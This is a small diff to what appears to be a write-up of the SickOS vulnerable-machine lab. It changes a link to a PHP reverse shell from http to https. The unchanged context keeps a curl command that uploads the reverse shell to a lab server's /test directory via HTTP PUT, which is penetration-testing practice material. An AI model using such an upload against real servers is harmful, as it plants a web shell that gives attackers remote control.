@@ -185,7 +185,7 @@ We can use curl to upload a PHP reverse shell to the /test directory on the web 
 curl --upload-file php-reverse-shell.php -v --url http://192.168.56.106/test/shell.php -0 --http1.0
 ```
 
-The shell can also be downloaded from here: [PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+The shell can also be downloaded from here: [PHP Reverse Shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
 ![Uploading via PUT](/assets/images/vh_sickos/vh_sickos_put_upload.jpg)
 
